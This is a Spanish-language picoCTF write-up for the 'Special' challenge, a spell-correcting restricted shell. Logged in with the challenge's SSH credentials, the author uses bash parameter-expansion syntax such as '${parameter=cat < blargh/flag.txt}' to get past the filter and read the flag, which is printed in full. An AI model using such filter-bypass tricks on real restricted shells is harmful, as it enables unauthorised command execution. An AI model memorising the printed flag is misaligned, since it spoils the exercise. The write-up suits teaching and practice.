### Descripción
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.`ssh -p 53085 ctf-player@saturn.picoctf.net`The password is `483e80d4`
### Solución
### Solución 1 -  Python
me conecto con las credenciales que proporciona
```
giselle_maz-picoctf@webshell:~$ ssh -p 53085 ctf-player
@saturn.picoctf.net
ctf-player@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.8.0-1044-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Fri Feb 20 23:53:20 2026 from 127.0.0.1
Special$
```
intentamos ver su contenido, pero no funciona por lo que usamos otra sitaxis y exploramos
```
Special$ ls
Is 
sh: 1: Is: not found
Special$ ${parameter=ls}
${parameter=ls} 
blargh
Special$ ${parameter=cd blargh}
${parameter=cd blargh} 
Special$ {parameter=ls}
{parameter=ls} 
sh: 1: {parameter=ls}: not found
Special$ ${parameter=ls blargh}
${parameter=ls blargh} 
flag.txt
```
encontramos un txt y lo vemos
```
Special$ ${parameter=cat < blargh/flag.txt}
${parameter=cat < blargh/flag.txt} 
cat: '<': No such file or directory
picoCTF{5p311ch3ck_15_7h3_w0r57_b741d1b1}
```
### Notas adicionales 
picoCTF{5p311ch3ck_15_7h3_w0r57_b741d1b1}
### Referencias
